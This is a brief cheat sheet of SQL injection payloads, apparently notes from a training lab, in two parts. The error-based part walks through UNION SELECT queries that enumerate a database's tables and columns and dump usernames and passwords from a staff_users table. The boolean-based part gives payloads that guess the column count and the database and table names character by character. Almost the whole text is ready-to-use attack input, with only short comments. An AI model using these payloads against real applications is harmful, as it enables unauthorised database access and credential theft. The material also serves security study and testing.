# SQL Injection

## Error Based

```
# Find the point of injection
# Find the database
article?id=0 UNION SELECT 1,2, database() #This returns sqli_one
# Find the tables 
0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'
# Get structure of the databae
0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'
# Select data
0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users
```



## Boolean Based

```sql
admin123' UNION SELECT 1;-- 
/*Guess the number of columns that are returned*/
admin123' UNION SELECT 1,2,3;-- 
## Then we start guess the name of the database
admin123' UNION SELECT 1,2,3 where database() like '%';--
admin123' UNION SELECT 1,2,3 where database() like 's%';--
## Once we have the database name, we start searching for the table name
admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like 'a%';--

```